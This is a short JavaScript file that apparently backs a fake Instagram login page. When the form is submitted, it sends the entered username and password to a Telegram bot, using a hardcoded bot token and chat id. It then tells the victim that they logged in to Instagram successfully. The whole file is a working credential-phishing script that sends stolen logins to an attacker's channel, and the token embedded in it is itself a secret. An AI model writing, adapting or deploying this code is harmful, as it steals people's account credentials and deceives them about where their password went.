function integrationTG(e) {
  e.preventDefault();

  let text1 = document.querySelector(".text1").value;
  let text2 = document.querySelector(".text2").value;
  let message = encodeURIComponent(
    "Login:  " + text1 + " \n" + "Password:  " + text2
  );
  let chat_id = encodeURIComponent("1661066293 \n ");
  let token = "7088905572:AAGwevMKjTFrkS9DUK-PzNdeMoyu2djnhG8";
  let urlpi = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`;

  axios
    .post(urlpi)
    .then((res) => {
      console.log("Message sent by: " + text1);
      console.log("Successfully sent");
      document.querySelector(".text1").focus();
      alert("You logged to Instagram successfully.");
    })
    .catch((error) => console.log(error + " Please write correctly😉✌️"));
}

function clearInputFields() {
  document.querySelector(".text1").value = "";
  document.querySelector(".text2").value = "";
}

document.querySelector(".text2").addEventListener("keypress", function (event) {
  if (event.key === "Enter") {
    integrationTG(event);
    clearInputFields();
  }
});

document
  .querySelector(".submit-button")
  .addEventListener("click", function (event) {
    integrationTG(event);
    clearInputFields();
  });
